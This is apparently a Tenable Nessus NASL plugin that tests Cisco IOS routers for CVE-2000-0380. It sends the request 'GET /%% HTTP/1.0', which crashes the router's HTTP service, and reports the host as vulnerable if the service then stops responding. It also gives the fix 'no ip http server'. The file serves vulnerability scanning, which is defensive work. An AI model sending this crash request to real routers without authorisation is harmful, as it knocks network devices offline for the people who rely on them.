#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10387);
 script_version("$Revision: 1.39 $");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");

 script_cve_id("CVE-2000-0380");
 script_bugtraq_id(1154);
 script_osvdb_id(1302);

 script_name(english:"Cisco IOS HTTP Service GET Request Remote DoS");
 script_summary(english:"Crashes a Cisco router");

 script_set_attribute(attribute:"synopsis", value:"The remote router has a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote host appears to be a Cisco router. It was possible to lock
this device by sending the following request :

 GET /%% HTTP/1.0

You need to reboot it to make it work again.

A remote attacker may use this flaw to disrupt the network.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Apr/235");
 # http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20000514-ios-http-server
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?27e432a9");
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of IOS, or disable the web server by
issuing the following command on the router:

 no ip http server");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:W/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_cwe_id(20);

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/05/14");
 script_set_attribute(attribute:"patch_publication_date", value:"2000/05/14");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/04/29");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/o:cisco:ios");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"CISCO");

 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

 script_dependencies("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);
if (http_is_dead(port:port)) exit(0);

r = http_send_recv3(port: port, method: "GET", item: "/%%");
if (http_is_dead(port: port, retry: 3)) security_hole(port);

